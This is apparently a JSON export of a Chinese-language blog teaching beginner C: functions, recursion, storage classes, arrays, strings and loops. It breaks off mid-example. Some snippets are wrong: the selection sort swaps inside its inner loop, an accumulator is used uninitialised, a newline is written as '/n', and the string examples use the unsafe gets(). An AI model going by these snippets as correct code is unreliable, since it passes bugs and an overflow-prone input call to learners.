functions","slug":"realize-modular-programming-with-functions","date":"2020-10-25T09:17:42.000Z","updated":"2021-04-11T17:11:28.516Z","comments":true,"path":"realize-modular-programming-with-functions/","link":"","permalink":"https://kayleh.top/realize-modular-programming-with-functions/","excerpt":"","text":"用函数实现模块化程序设计 Realize modular programming with functions 用函数输出以下结果： 123*****************How do you do!***************** 123456789101112131415161718192021#include&lt;stdio.h&gt;int main()&#123; void print_star();//函数的声明 void print_message();//函数的声明 print_star(); print_message(); print_star(); return 0;&#125;void print_star()&#123; printf(\"*****************\\n\");&#125;void print_message()&#123; printf(\"How do you do!\\n\");&#125; 函数声明的作用是把有关函数的信息(函数名,函数类型,函数参数的个数与类型)通知编译系统,以便在编译系统对程序进行编译时,在进行到main函数调用print_star()和print_message()时知道它们是函数而不是变量或其他对象,还对调用函数的正确性进行检查. 函数间可以互相调用,但不能调用main函数,main函数是被操作系统调用的. 函数从用户使用的角度看分为: 库函数 用户自己定义的函数 从函数形式分为: 无参函数 有参函数 怎么定义函数定义函数应包括哪些内容: 函数的名字,方便按名调用 函数的类型,即函数返回值的类型 函数的参数的名字和类型,调用函数时需要传递的数据 函数的功能,函数体 定义无参函数123456789类型名 函数名()&#123; 函数体&#125;或类型名 函数名(void)&#123; 函数体&#125; 函数体包括声明部分(变量)和语句部分. 定义有参函数1234类型名 函数名(形式参数表列)&#123; 函数体&#125; 定义空函数12类型名 函数名()&#123;&#125; 调用函数函数调用的形式 函数名(实参表列) 函数调用方式 调用语句 函数表达式 要求函数带回一个确定的值以参加表达式的运算 1c=2*max(a,b); 函数参数 函数调用作为另一个函数调用时的实参,如: 1m=max(a,max(b,c)); 函数调用时的数据传递形式参数和实际参数 形式参数 在定义函数时函数名后面括号中的变量名称为形式参数 实际参数 在主调函数调用一个函数时,函数名后面括号中的变量名称为实际参数 实参和形参间的数据传递 在调用函数过程中,系统会把实参中的值传递给被调函数的形参. 输入两个整数,要求输出其中值较大者,要求用函数来找到最大值.12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int max(int x, int y); int a, b, c; printf(\"please enter 2 integer numbers:\"); scanf(\"%d,%d\", &amp;a, &amp;b); c = max(a, b); printf(\"max is %d\", c); return 0;&#125;int max(int x, int y)&#123;c int z; z = x &gt; y ? x : y; return z;&#125; 函数调用的执行过程1)在定义函数中指定的形参,在未出现函数调用的时,它们并不占内存中的存储单元,在发生函数调用时,函数max的形参才被临时分配内存单元. 2)将实参的值传递给对应形参 3)在执行max函数期间,由于形参已经有值,就可以利用形参进行有关的运算 4)通过return语句将函数值带回到主调函数. 5)调用结束,形参单元被释放. 注意:实参单元仍保留并维持原值.没有改变.如果在执行一个被调函数时,形参的值发生改变,不会改变主调函数的实参的值.如:在执行max函数时,x和y的值变为10和15,但a和b仍为2和3,这是因为形参和实参是两个不同的存储单元. 函数的返回值 函数的返回值是通过return语句中获得的. 函数返回值的类型是函数的类型. 在定义函数时指定的函数类型一般应该和return语句中的表达式类型一致. 将在max函数中定义的变量z改为float型,函数返回值与指定的函数类型不同 12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int max(float x, float y); float a, b; int c; scanf(\"%f,%f\", &amp;a, &amp;b); c = max(a, b); printf(\"max is %d\", c); return 0;&#125;int max(float x, float y)&#123; float z; z = x &gt; y ? x : y; return (z);&#125;---------1.5,2.6max is 2 对被调用函数的声明和函数原型输入两个实数,用一个函数求它们之和. 123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; float add(float x, float y); float a, b, c; scanf(\"%f,%f\", &amp;a, &amp;b); c = add(a, b); printf(\"sum is %d\", c); return 0;&#125;float add(float x, float y)&#123; float z; z = x + y; return (z);&#125; 函数声明的两种形式1)函数类型 函数名(参数类型1 参数名1,参数类型2 参数名2,…参数类型n 参数名n) 2)函数类型 函数名(参数类型1,参数类型2,…,参数类型n) 编译系统只关心和检查参数个数和参数类型,而不检查参数名,因为在调用函数时只要求保证实参类型与形参类型一致,而不必考虑形参名是什么.因此在函数声明中 函数原型函数的首部称为函数原型 函数的嵌套调用输入4个整数,找出其中最大的数123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123; int max4(int a, int b, int c, int d); int a, b, c, d, max; printf(\"please enter 4 integer numbers:\"); scanf(\"%d %d %d %d\", &amp;a, &amp;b, &amp;c, &amp;d); max = max4(a, b, c, d); printf(\"max:%d\", max); return 0;&#125;int max2(int a, int b)&#123; if (a &gt;= b) return a; else return b;&#125;int max4(int a, int b, int c, int d)&#123; int max2(int, int);//函数声明 int m; m = max2(a, b); m = max2(m, c); m = max2(m, d); return m;&#125; 改进: 1234567891011121314151617181920212223#include&lt;stdio.h&gt;int main()&#123; int max4(int a, int b, int c, int d); int a, b, c, d, max; printf(\"please enter 4 integer numbers:\"); scanf(\"%d %d %d %d\", &amp;a, &amp;b, &amp;c, &amp;d); max = max4(a, b, c, d); printf(\"max:%d\", max); return 0;&#125;int max2(int a, int b)&#123; return a &gt;= b ? a : b;&#125;int max4(int a, int b, int c, int d)&#123; int max2(int, int);//函数声明 return max2(max2(max2(a, b), c), d);;&#125; 函数的递归调用 一个递归的问题可以分为”回溯”和”递推”两个阶段. 用递归的方法求n! . n!=1 (n=0,1) n!=n×(n-1) (n&gt;1) 1234567891011121314151617181920212223#include&lt;stdio.h&gt;int main()&#123; int fac(int n); int n, y; printf(\"please enter an integer number:\"); scanf(\"%d\", &amp;n); y = fac(n); printf(\"%d!=%d\", n,y); return 0;&#125;int fac(int n)&#123; int f; if (n &lt; 0) printf(\"n&lt;0.data error!\"); else if (n == 0 || n == 1) f = 1; else f = fac(n - 1) * n; return f;&#125; 汉诺塔问题123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123; void hanoi(int n, char one, char two, char three); int m; printf(\"input the number of diskes:\"); scanf(\"%d\", &amp;m); hanoi(m, 'A', 'B', 'C'); return 0;&#125;void hanoi(int n, char one, char two, char three)&#123; //将n个盘从one座借助two座移动到three座 void move(char x, char y); if (n == 1) move(one, three); else &#123; hanoi(n - 1, one, three, two); move(one, three); hanoi(n - 1, two, one, three); &#125;&#125;void move(char x, char y)&#123; printf(\"%c --&gt; %c\\n\", x, y);&#125; 数组作为函数参数 在用数组元素作函数实参时,把实参的值传给形参,是“值传递”方式,数据的传递是由形参传到实参,单向传递. 输入10个数,要求输出其中值最大的元素和该数是第几个数.12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;int main()&#123; int max(int x, int y); int a[10], i, m, n; printf(\"please enter 10 integer numbers:\"); for (i = 0; i &lt; 10; i++) &#123; scanf(\"%d\", &amp;a[i]); &#125; printf(\"\\n\"); for (i = 1, n = 0, m = a[0]; i &lt; 10; i++) &#123; if (max(m, a[i]) &gt; m) &#123; m = max(m, a[i]); n = i; &#125; &#125; printf(\"the large number is %d\\nit is the %dth number.\", m, n + 1); return 0;&#125;int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; 一维数组名作函数参数有一个一维数组score,内放10个学生成绩,求平均成绩.12345678910111213141516171819202122232425#include&lt;stdio.h&gt;int main()&#123; float average(float array[10]); float score[10], aver; int i; printf(\"input 10 scores:\\n\"); for (i = 0; i &lt; 10; i++) scanf(\"%f\", &amp;score[i]); printf(\"\\n\"); aver = average(score); printf(\"average score is %5.2f\\n\", aver); return 0;&#125;float average(float array[10])&#123; int i; float aver, sum = array[0]; for (i = 1; i &lt; 10; i++) sum = sum + array[i]; aver = sum / 10; return aver;&#125; 形参数组可以不指定大小,在定义数组时在数组名后加上空括号,如 1float average(float array[]) 有两个班级,分别有35名和39名学生,调用一个average函数,分别求两个班的学生的平均成绩.1234567891011121314151617181920212223#include&lt;stdio.h&gt;int main()&#123; float average(float array[], int n); float score1[5] = &#123;89, 99.5, 99, 45, 78&#125;; float score2[10] = &#123;85.5, 10.5, 87.5, 78.5, 67.5, 90.5, 99.5, 87.5, 88, 78.5&#125;; //用数组名作实参 printf(\"The average of class A is %6.2f\\n\", average(score1, 5)); printf(\"The average of class B is %6.2f\\n\", average(score2, 10)); return 0;&#125;float average(float array[], int n)&#123; int i; float aver, sum = array[0]; for (i = 1; i &lt; n; i++) sum = sum + array[i]; aver = sum / n; return (aver);&#125; 使用选择法对10个整数从小到大排序12345678910111213141516171819202122232425262728293031323334353637#include&lt;stdio.h&gt;int main()&#123; void sort(int array[], int n); int a[10], i; printf(\"please enter array:\"); for (i = 0; i &lt; 10; i++) &#123; scanf(\"%d\", &amp;a[i]); &#125; sort(a, 10); printf(\"the sorted array:\"); for (i = 0; i &lt; 10; i++) &#123; printf(\"%d\", a[i]); &#125; printf(\"/n\"); return 0;&#125;void sort(int array[], int n)&#123; int i, j, k, t; for (i = 0; i &lt; n - 1; i++) &#123; k = i; for (j = i + 1; j &lt; n; j++) &#123; if (array[j] &lt; array[k]) k = j; t = array[k]; array[k] = array[i]; array[i] = t; &#125; &#125;&#125; 多维数组名作函数参数可以使用多维函数数组名作为函数的实参和形参. 形参数组和实参数组都是由相同类型和大小的一维数组组成的.C语言编译系统不检查第一维的大小. 有一个3×4的矩阵,求所有元素的最大值.1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;int main()&#123; int max_value(int array[][4]); int a[3][4] = &#123;&#123;1, 3, 5, 7&#125;, &#123;2, 4, 6, 8&#125;, &#123;15, 17, 34, 12&#125;&#125;; printf(\"max value is %d\", max_value(a));&#125;int max_value(int array[][4])&#123; int max, i, j; max = array[0][0]; for (i = 0; i &lt; 3; ++i) &#123; for (j = 0; j &lt; 4; ++j) &#123; if (array[i][j] &gt; max) max = array[i][j]; &#125; &#125; return max;&#125; 注意: 1.形参数组array第一维的大小省略,第2维大小不能省略,而且要和实参数组a的第2维大小相同. 2.在主函数调用max_value函数时,把实参二维数组a的第1行的起始地址传递给形参数组array.因此array数组第一行的起始地址与a数组的第一行起始地址相同. 局部变量和全局变量作用域 每个变量都有作用域问题,即它们在什么范围内有效. 局部变量定义变量有3种情况: (1)在函数的开头定义 (2)在函数内的复合语句内定义 (3)在函数的外部定义 说明:1.主函数中定义的变量也只在主函数中有效 2.不同函数中可以使用同名的变量 3.形式参数也是局部变量 4.在一个函数内部,可以在复合语句中定义变量,这些变量只在本复合语句中有效,这种复合语句也称为”分程序”或”程序块”.离开复合语句,变量就无效,系统会把占用的内存资源释放. 全局变量 程序的编译单位是源程序文件. 在函数之内定义的变量是局部变量, 在函数之外定义的变量是外部变量,是全局变量.它的有效范围为从定义变量的位置开始到本源程序文件结束. 非必要不建议使用全局变量:1.在全部执行过程中都占用存储单元,而不是仅在需要时才开辟单元. 2.减低程序的清晰性,不易维护 变量的存储方式和生存期动态存储方式和静态存储方式从变量值的存在时间(即生存期)来分: 静态存储方式:程序在运行期间由系统分配固定的存储空间的方式 动态存储方式:程序运行期间根据需要进行动态的分配存储空间的方式. 数据分别存放在静态存储区和动态存储区,全局变量全部存放在静态存储区中. 在动态存储区中存放以下数据: ①函数形式参数。在调用函数时给形参分配存储空间。 ②函数中定义的没有用关键字static声明的变量,即自动变量. ③函数调用时的现场保护和返回地址. 如果在一个程序中两次调用同一函数,而在此函数中定义了局部变量,在两次调用时分配给这些局部变量的存储空间的地址可能不一样. 每个变量和函数都有两个属性,数据类型(如整型,浮点型)和数据的存储类型(静态存储,动态存储). 在定义和声明变量和函数时,一般应同时指定其数据数据类型和存储类型,也可以以默认的方式指定(即如果用户不指定,系统会隐含地指定为某一种存储类型). C的存储类别: 自动的(auto) 静态的(static) 寄存器的(register) 外部的(extern) 局部变量的存储类别自动变量(auto变量)函数中的局部变量,如果不专门声明为static(静态)存储类型,都是动态地分配存储空间的,数据存储在动态存储区中.程序运行期间根据需要进行动态的分配存储空间的方式.因此这类局部变量称为自动变量. 自动变量用关键字auto作存储类别的声明. 1234int f(int a) //定义f函数，a为形参&#123; auto int b, c = 3; //定义b，c为自动变量&#125; 执行完后自动释放a,b,c所占的存储单元. auto关键字可以省略,不写auto则隐含指定为”自动存储类别”,属于动态存储方式. 静态局部变量(static局部变量)有时希望函数中的局部变量的值在函数调用结束后不消失而继续保留原值,即其占用的存储空间不释放,在下一次再调用该函数时,该变量已有值(就是上一次函数调用结束的值) 1234567891011121314151617181920212223#include&lt;stdio.h&gt;int main()&#123; int f(int); int a = 2, i; for (i = 0; i &lt; 3; i++) printf(\"%d\\n\", f(a)); return 0;&#125; int f(int a)&#123; auto int b = 0; static c = 3; b = b + 1; c = c + 1; return (a + b + c);&#125;--------789 对静态局部变量是在编译时赋初值的,即只赋值一次,在程序运行时它已有初值. 而对自动变量是在函数调用时进行的,每调用一次函数重新给一次初值. 在定义局部变量时不赋初值的话,则对静态变量来说,编译时自动赋初值0(对数值型变量)或空字符’\\0’(对字符变量). 而对自动变量来说,它的值是一个不确定的值.由于每次函数调用结束后存储单元已释放,下次调用时又重新另分配存储单元,而所分配的单元内容是不可知的. 输出1到5的阶乘值.(局部静态变量)12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int fac(int); int i; for (i = 1; i &lt;= 5; ++i) &#123; printf(\"%d!=%d\\n\", i, fac(i)); &#125; return 0;&#125;int fac(int n)&#123; static int f = 1;//f保留了上次函数调用结束的值 f = f * n; return (f);&#125; 不建议使用静态存储,长期占用不释放. 寄存器变量(register变量) 为提高执行效率，允许将局部变量的值放在CPU中的寄存器中，需要用时直接从寄存器取出参加运算，不必再到内存中取存取。 优化的编译系统能够识别使用频繁的变量，从而自动地将这些变量放在寄存器中。因此实际上用register声明变量的必要性不大。 三种局部变量的存储位置是不同的： 自动变量是存储在动态存储区； 静态局部变量是存储在静态存储区； 寄存器存储在CPU中的寄存器中。 全局变量的存储类型在一个文件内扩展外部变量的作用域 如果由于某种考虑，在定义点之前的函数需要引用该外部变量，则在引用之前用关键字extern对该变量作“外部变量声明”，表示把该外部变量的作用域扩展到此位置。 调用函数，求3个整数中的大者。12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int max(); int i; extern int A, B, C; printf(\"please enter three integer numbers:\"); scanf(\"%d %d %d\", &amp;A, &amp;B, &amp;C); printf(\"max is %d\\n\", max()); return 0;&#125;int A, B, C;int max()&#123; int m; m = A &gt; B ? A : B; if (C &gt; m)m = C; return m;&#125; 将外部变量的作用域扩展到其他文件给定b的值，输入a和m，求a*b和$a^m$的值12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;//file1.cint A;int main()&#123; int power(int); int b = 3, c, d, m; printf(\"please enter the number a and its power m:\\n\"); scanf(\"%d,%d\", &amp;A, &amp;m); c = A * b; printf(\"%d*%d=%d\\n\", A, b, c); d = power(m); printf(\"%d**%d=%d\\n\", A, m, d); return 0;&#125;//file2.cextern A;int power(int n)&#123; int i, y = 1; for (i = 1; i &lt;= n; i++) y *= A; return y;&#125; extern既可以用来扩展外部变量在本文件的作用域,又可以使外部变量的作用域从一个文件扩展到程序中的其他文件,那么系统怎么区别处理呢? 在编译时遇到extern时,先在本文件中找外部变量的定义,如果找到,则在本文件中扩展作用域; 如果找不到,就在连接时从其他文件找到外部变量的定义,如果从其他文件中找到了,就将作用域扩展到本文件;如果再找不到,就按出错处理. 将外部变量的作用域限制在本文件中有时在程序设计中希望某些外部变量只限于被本文件引用,而不能被其他文件引用,这时可以在定义外部变量时加一个static声明. 加上static声明,只能用于本文件的外部变量称为静态外部变量.这就为程序的模块化,通用性提供方便. 如果已确认其他文件不需要引用本文件的外部变量,就可以对本文件的外部变量都加上static,成为静态外部变量,以免被其他文件误用.这就相当于把本文件的外部变量对外界”屏蔽起来”,从其他文件的角度看,这个静态外部变量是”看不见的,不能用的”. 用static声明一个变量的作用: 对局部变量使用: 把它分配在静态存储区,该变量在整个程序执行期间不释放,其所分配的空间始终存在. 对全局变量使用: 则该变量的作用域只限于本文件模块(即被声明的文件中). 注意:auto,static,register声明变量时,是在定义变量的基础上加上这些关键字,不能单独使用 如: 12int a;static a; //企图将变量a声明为静态变量 编译时会被认为”重新定义”. 关于变量的声明和定义 定义:建立存储空间的声明(“int a;”),定义性声明 声明:不建立存储空间的声明(“extern a;”),引用性声明 声明包括定义,但并非所有的声明都是定义. 内部函数和外部函数内部函数如果一个函数只能被本文件中的其他函数所调用，它称为内部函数，在定义内部函数时，在函数名和函数类型的前面加static，即： 12static 类型名 函数名(形参表)static int fun(int a,int b) 内部函数又被称为静态函数，因为它是用static声明的。使用内部函数，可以使函数的作用域只局限于所在文件。这样，在不同的文件中即使有同名的内部函数，也互不干扰，不必担心所用函数是否会与其他文件中的模块中的函数同名。 外部函数如果在定义函数时，在函数首部的最左端加关键字extern，则此函数是外部函数，可供其他文件使用。 如函数首部可以为： 1extern int fun(int a,int b) 这样，函数fun就可以为其他文件调用。c语言规定，如果在定义函数时省略extern，则默认为外部函数。 有一个字符串，内有若干个字符，现输入一个字符，要求程序将字符串中该字符删去。1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;//file1.cint main()&#123; extern void enter_string(char str[80]); extern void delete_string(char str[], char ch); extern void print_string(char str[]); char c, str[80]; enter_string(str); scanf(\"%c\", &amp;c);//输入需要删除的字符 delete_string(str, c); print_string(str); return 0;&#125;//file2.cvoid enter_string(char str[80])&#123; gets(str);&#125;//file3.cvoid delete_string(char str[], char ch)&#123; int i, j; for (int i = j = 0; str[i] != '\\0'; i++) if (str[i] != ch) str[j++] = str[i]; str[j] = '\\0';&#125;//file4.cvoid print_string(char str[])&#123; printf(\"%s\\n\", str);&#125; extern可以省略","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"use-arrays-to-process-batch-data","slug":"use-arrays-to-process-batch-data","date":"2020-10-25T09:17:20.000Z","updated":"2021-04-11T17:11:28.542Z","comments":true,"path":"use-arrays-to-process-batch-data/","link":"","permalink":"https://kayleh.top/use-arrays-to-process-batch-data/","excerpt":"","text":"利用数组处理批量数据 use-arrays-to-process-batch-data 1.数组使一组有序数据的集合. 2.用一个数组名和下标来唯一地确定数组中的元素 3.数组中的每一个元素都属于同一个数据类型 怎样定义和引用一维数组 类型符 数组名[常量表达式] 怎么引用一维数组元素 数组名[下标] 对10个数组元素依次赋值为0,1,2,3,4,5,6,7,8,9,要求按逆序输出. 123456789101112131415#include&lt;stdio.h&gt;int main()&#123; int i, a[10]; for (i = 0; i &lt;= 9; i++) &#123; a[i] = i; &#125; for (i = 9; i &gt;= 0; i--) &#123; printf(\"%d \", a[i]); &#125; return 0;&#125; 一维数组的初始化1)在定义数组时对全部数组元素赋予初值. 2)可以只给数组中的一部分元素赋值(只给前n个元素赋值,其余的元素自动赋值为0) 3)如果想使一个数组中全部元素值为0,可以写成 1int a[10]=&#123;0&#125;; 4)在对全部元素赋值时,如果数据的个数已经确定,因此可以不指定数组长度. 用数组来处理求Fibonacci数列问题12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int i; int f[20] = &#123;1, 1&#125;; for (i = 2; i &lt; 20; i++) &#123; f[i] = f[i - 2] + f[i - 1]; &#125; for (i = 0; i &lt; 20; i++) &#123; if (i % 5 == 0) printf(\"\\n\"); printf(\"%12d\", f[i]); &#125; printf(\"\\n\"); return 0;&#125; 有10个地区的面积,要求对它们按由小到大的顺序排列(冒泡排序)123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123; int a[10]; int i, j, t; printf(\"input 10 numbers:\\n\"); for (i = 0; i &lt; 10; i++) scanf(\"%d\", &amp;a[i]); printf(\"\\n\"); for (j = 0; j &lt; 9; j++) &#123; for (i = 0; i &lt; 9 - j; i++) &#123; if (a[i] &gt; a[i + 1]) &#123; t = a[i]; a[i] = a[i + 1]; a[i + 1] = t; &#125; &#125; &#125; printf(\"the sorted number:\\n\"); for (i = 0; i &lt; 10; i++) &#123; printf(\"%d \", a[i]); &#125; printf(\"\\n\"); return 0;&#125; 怎样定义和引用二维数组二维数组常称为矩阵. 怎么定义二维数组 float pay[3][6] 类型说明符 数组名[常量表达式][常量表达式] 二维数组中元素排列的顺序是按行存放的,即在内存中先顺序存放第1行的元素,接着再存放第2行的元素.所以第1维的下标变化最慢,最右边的下标变化最快 二维数组的初始化$花括号显示异常 1)分行给二维数组赋初值 int a[3][4]=({1,2,3,4},{5,6,7,8},{9,10,11,12}) 2)可以将所有数据写在一个花括号内,按数组元素在内存中的排列顺序对各元素赋初值. int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12} 3)可以对部分元素赋初值 int a[3][4]=({1},{5},{9}) 1 0 0 0 5 0 0 0 9 0 0 0 也可以不赋初值 1int a[3][4]=(&#123;1&#125;,&#123;&#125;,&#123;9&#125;) 4)如果对全部元素都赋初值(即提供全部初始数据),则定义数组时对第1维的长度可以不指定,但第2维的长度不能省. 如: 123int a[3][4]=&#123;1,2,3,4,5,6,7,8,9,10,11,12&#125;;等价于int a[][4]=&#123;1,2,3,4,5,6,7,8,9,10,11,12&#125;; 在定义时也可以只对部分元素赋初值而省略第1维的长度,但应分行赋值. 1int a[][4]=(&#123;0,0,3&#125;,&#123;&#125;,&#123;0,10&#125;); 将一个二维数组行和列的元素互换,存到另一个二维数组里面.1234例如: 1 4a&#x3D;[1 2 3] b &#x3D; [ 2 5 ] 4 5 6 3 6 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;int main()&#123; int a[2][3] = &#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;&#125;; int b[3][2], i, j; printf(\"array a:\\n\"); for (i = 0; i &lt;= 1; i++) &#123; for (j = 0; j &lt;= 2; j++) &#123; printf(\"%5d\", a[i][j]); b[j][i] = a[i][j]; &#125; printf(\"\\n\"); &#125; printf(\"array b:\\n\"); for (i = 0; i &lt;= 2; ++i) &#123; for (j = 0; j &lt;= 1; ++j) &#123; printf(\"%5d\", b[i][j]); &#125; printf(\"\\n\"); &#125; return 0;&#125; 字符数组用来存放字符数据的数组时字符数组. 例如: 1234567char c[10]; c[0] = 'I'; c[1] = ' '; c[2] = 'a'; c[3] = 'm'; c[4] = ' '; c[5] = 'K'; 由于字符型数据是以整数形式(ASCII代码)存放的,因此也可以用整型数组来存放字符数据. 12int c[10];c[1] = 'a';//合法，但浪费存储空间 字符数组的初始化如果初值个数小于数组长度，则只将这些字符赋给数组中前面那些元素，其余的元素自动定为空字符(即’\\0’).如: 1char c[10] = &#123;'c', ' ', 'p', 'p'&#125;; 如果提供的初值个数与预定的数组长度相同,在定义时可以省略数组长度,系统会自动根据初值个数确定数组长度 1char c[] = &#123;'c', ' ', 'p', 'p'&#125;; 也可以定义二维字符数组 1char diamond[5][5] = &#123;&#123;' ', ' ', '*'&#125;, &#123;' ', '*', ' ', '*'&#125;,&#123;'*', ' ', ' ', ' ', '*'&#125;,&#123; ' ', '*', ' ', '*' &#125;,&#123; ' ', ' ', '*' &#125;&#125;; 怎样引用字符数组中的元素输出一个已知的字符串 1234567891011#include&lt;stdio.h&gt;int main()&#123; char c[15] = &#123;'I', ' ', 'a', 'm', ' ', 'a', ' ', 's', 't', 'u', 'd', 'e', 'n', 't'&#125;; int i; for (i = 0; i &lt; 15; i++) printf(\"%c\", c[i]); printf(\"\\n\"); return 0;&#125; 输出一个菱形图 123456789101112131415#include&lt;stdio.h&gt;int main()&#123; char diamond[5][5] = &#123;&#123;' ', ' ', '*'&#125;, &#123;' ', '*', ' ', '*'&#125;, &#123;'*', ' ', ' ', ' ', '*'&#125;,&#123; ' ', '*', ' ', '*' &#125;,&#123; ' ', ' ', '*' &#125;&#125;; int i, j; for (i = 0; i &lt; 5; i++) &#123; for (j = 0; j &lt; 5; j++) printf(\"%c\", diamond[i][j]); printf(\"\\n\"); &#125; return 0;&#125; 字符串和字符串你结束标志遇到字符’\\0’时,表示字符串结束,把它前面的字符组成一个字符串. C系统在用字符数组存储字符串常量时会自动加一个’\\0’作为结束符.遇到’\\0’会停止输出 例如: 1234char c[] = &#123;\"I am happy\"&#125;;char c[] = \"I am happy\";//花括号可以省略//可以写成:char c[] = &#123;'I', ' ', 'a', 'm', ' ', 'h', 'a', 'p', 'p', 'y','\\0'&#125;; 此时数组c的长度不是10而是11,因为字符串常量的最后由系统加上一个’\\0’. 字符数组的输入输出1)逐个字符输入输出,用格式符”%c”输入或输出一个字符. 2)将整个字符串一次输入或输出.用”%s”格式符,意思是对字符串(string)的输入输出. 例如: 12char c[] = &#123;\"China\"&#125;;printf(\"%s\\n\", c); 1.如果一个字符数组中包含一个以上’\\0’,则遇到第一个’\\0’时输出就结束. 2.可以用scanf函数输入一个字符串,如: 12scanf(\"%s\",c); 3.数组中未被赋值的元素的值自动置’\\0’ 4.系统会把空格字符作为输入的字符串之间的分隔符 5.scanf函数中的输入项如果是字符数组名,不要再加地址符&amp;,因为在C语言中数组名代表该数组第一个元素的地址(或者说数组的起始地址) 下面的写法是不正确的: 12scanf(\"%s\",&amp;str); //str前面不应加&amp; 实际上是这样执行的: 按字符数组名c找到其数组第一个元素的地址,然后逐个输出其中的字符,直到遇’\\0’为止. 使用字符串处理函数puts函数———输出字符串的函数 puts (字符数组) 其作用是将一个字符串(以’\\0’结束的字符序列)输出到终端. 在用puts输出时的字符串结束标志’\\0’换成’\\n’,即输出完字符串后换行. gets函数———输入字符串的函数 gets (字符数组) 其作用是从终端输入一个字符串到字符数组,并且得到一个函数值.该函数值是字符数组的起始地址. 将输入的字符串送给字符数组(字符数组得到的是输入的字符串+’\\0’),返回的函数值是字符数组str的第一个元素的地址. strcat函数———字符串连接函数 strcat(字符数组1,字符数组2) 其作用是把两个字符数组的字符串连接起来,把字符串2连接到字符串1后面,结果放在字符数组1中.函数调用得到函数值是字符数组1的地址. 1.字符数组1必须足够大 2.连接前两个字符串后面都有’\\0’,连接时将字符串1后面的’\\0’取消,只在新字符串后面保留. strcpy和strncpy函数———字符串复制函数 strcpy(字符数组1,字符串2) 作用是将字符串2复制到字符串1中去. “字符数组1”必须写成数组名形式,”字符串2”可以是字符数组名,也可以是一个字符串常量 如果在复制前未对str1数组初始化或赋值,则str1的各字节的内容是无法预知的. 不能使用赋值语句将一个字符串常量或字符数组直接给一个字符数组,字符数组是一个地址常量,它不能改变值. 可以用strncpy函数将字符串2中前面n个字符复制到字符数组1中去. 1strncpy(str1,str2,2); strcmp函数——字符串比较函数 strcmp(字符串1,字符串2) 将两个字符串自左至右逐个字符相比(按ASCII码值大小比较),直至出现不同的字符或遇到’\\0’为止. 1)若全部字符相同,则认为两个字符串相同 2)若出现不相同的字符,则以第1对不相同的字符的比较结果为准. 如果 s1 和 s2 是相同的，则返回 0；如果 s1s2 则返回大于 0。 strlen函数———测字符串长度的函数 strlen(字符数组) 123char c[10] = &#123;\"China\"&#125;;printf(\"%d\", strlen(c));//结果是5 strlwr函数———转换为小写的函数 strlwr(字符串) strupr函数———转换为大写的函数 strupr(字符串) 输入一行字符统计其中有多少个单词,单词间用空格分隔开123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; char string[81]; int i, num = 0, word = 0; char c; gets(string); for (i = 0; (c = string[i]) != '\\0'; i++) if (c == ' ')word = 0; else if (word == 0) &#123; word = 1; num++; &#125; printf(\"There are %d words in the lines.\\n\", num); return 0;&#125; 有3个字符串要求找到其中“最大”者12345678910111213141516171819#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char str[3][20];//定义二维数组 char string[20];//定义一维数组，作为交换字符串时的临时字符数组 int i; for (i = 0; i &lt; 3; i++) gets(str[i]);//读入3个字符串 if (strcmp(str[0], str[1]) &gt; 0) strcpy(string, str[0]); else strcpy(string, str[1]); if (strcmp(str[2], string) &gt; 0) strcpy(string, str[2]); printf(\"\\nthe largest string is:\\n%s\\n\", string); return 0;&#125;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"cycle structure programming","slug":"cycle-structure-programming","date":"2020-10-25T09:16:57.000Z","updated":"2021-04-11T17:11:28.490Z","comments":true,"path":"cycle-structure-programming/","link":"","permalink":"https://kayleh.top/cycle-structure-programming/","excerpt":"","text":"循环结构体程序设计用while语句实现循环 while (表达式) 语句 求1+2+3+….+100;1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int i = 1; int sum = 0; while (i &lt;= 100) &#123; sum += i; i++; &#125; printf(\"%d\", sum); return 0;&#125; 用do…while语句实现循环 do ​ 语句 while (表达式); 如: 1234567891011#include&lt;stdio.h&gt;int main()&#123; int i = 1; do &#123; printf(\"%d\\n\", i++); &#125; while (i &lt;= 100); return 0;&#125; 求1+2+3+….+100;12345678910111213#include&lt;stdio.h&gt;int main()&#123; int i = 1,sum = 0; do &#123; sum += i; i++; &#125; while (i &lt;= 100); printf(\"%d\", sum); return 0;&#125; while和do…while的区别do…while无论如何都会至少执行一次循环体 while只要不满足就不会执行循环体 用for语句实现循环 for(循环变量赋初值;循环条件;循环变量增值) ​ 语句 如: for(i=1;i&lt;=100;i++) ​ sum+=i; 循环的嵌套改变循环的执行状态用break语句提前终止循环在全系1000名学生中举行慈善募捐,当总数达到10万时就结束,统计此时捐款的人数以及平均每人捐款的数目. 1234567891011121314151617181920#include&lt;stdio.h&gt;#define SUM 100000int main()&#123; float amount, aver, total; int i; for (i = 1; i &lt; 1000; i++) &#123; printf(\"please enter amount:\"); scanf(\"%f\", &amp;amount); total += amount; if (total &gt;= SUM)break; &#125; aver = total / i; printf(\"num=%d\\naver=%10.2f\\n\", i, aver); return 0;&#125; break的作用就是使流程跳到循环体之外,接着执行循环体下面的语句. 用continue语句提前结束本次循环有时不希望终止整个循环的操作,而只希望提前结束本次循环,而接着执行下次循环.这时可以用continue语句 要求输出100~200的不能被3整除的数 1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int n; for (n = 100; n &lt;= 200; n++) &#123; if (n % 3 == 0) continue; printf(\"%d\\t\", 